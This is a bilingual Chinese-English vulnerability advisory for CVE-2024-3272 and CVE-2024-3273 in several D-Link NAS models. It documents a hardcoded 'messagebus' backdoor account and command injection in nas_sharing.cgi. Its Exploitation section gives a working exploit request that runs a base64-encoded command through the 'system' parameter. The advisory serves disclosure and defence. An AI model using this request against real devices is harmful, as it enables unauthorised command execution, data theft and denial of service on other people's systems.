# CVE-2024-3272&CVE-2024-3273

>D-Link网络存储是D-link公司的一款统一服务路由器。

## 来源

[https://github.com/netsecfish/dlink](https://github.com/netsecfish/dlink)

## 简介

D-Link DNS-320L、DNS-325、DNS-327L、DNS-340L等多个产品的/cgi-bin/nas_sharing.cgi脚本中存在硬编码后门漏洞（用户名messagebus，密码为空），以及可通过system参数导致命令注入漏洞，威胁者可组合利用这两个漏洞通过HTTP GET请求将Base64编码的命令添加到system参数从而在系统上执行任意命令，成功利用可能导致未授权访问敏感信息、修改系统配置或拒绝服务等。

## 漏洞类型

后门、命令注入

## 影响范围

-   DNS-320L 1.11
-   DNS-320L 1.03.0904.2013
-   DNS-320L 1.01.0702.2013
-   DNS-325 1.01
-   DNS-327L 1.09
-   DNS-327L 1.00.0409.2013
-   DNS-340L 1.08

## **Vulnerability Summary:**

The described vulnerability affects multiple D-Link NAS devices, including models DNS-340L, DNS-320L, DNS-327L, and DNS-325, among others. The vulnerability lies within the **`nas_sharing.cgi`** uri, which is vulnerable due to two main issues: a backdoor facilitated by hardcoded credentials, and a command injection vulnerability via the **`system`** parameter. This exploitation could lead to arbitrary command execution on the affected D-Link NAS devices, granting attackers potential access to sensitive information, system configuration alteration, or denial of service, by specifying a command,affecting over 92,000 devices on the Internet.

![Untitled](./fofa-result.png)

## Corresponding CWE

CWE-77 (Command Injection) and CWE-798 (Use of Hard-coded Credentials).

## Affected Devices:

- DNS-320L Version 1.11, Version 1.03.0904.2013, Version 1.01.0702.2013
- DNS-325 Version 1.01
- DNS-327L Version 1.09, Version 1.00.0409.2013
- DNS-340L Version 1.08

## Vulnerability Details:

The vulnerability exists in the `nas_sharing.cgi` CGI script, which leads to:

1. **Backdoor through Username and Password Exposure**: The request includes parameters for a username (**`user=messagebus`**) and an empty password field (**`passwd=`**). This indicates a backdoor allowing unauthorized access without proper authentication.
2. **Command Injection through the System Parameter**: The **`system`** parameter within the request carries a base64 encoded value that, when decoded, appears to be a command.

## Exploitation:

Craft Malicious HTTP Request: Prepare an HTTP GET request targeting the `/cgi-bin/nas_sharing.cgi` endpoint.

```http
GET /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=<BASE64_ENCODED_COMMAND_TO_BE_EXECUTED>
```

## **Actual Result**

![Untitled](./dns-320.jpg)

## Impact:

Successful exploitation of this vulnerability could allow an attacker to execute arbitrary commands on the system, potentially leading to unauthorized access to sensitive information, modification of system configurations, or denial of service conditions.

## **Fix Recommendation:**

- Apply available patches and updates from the device manufacturer.
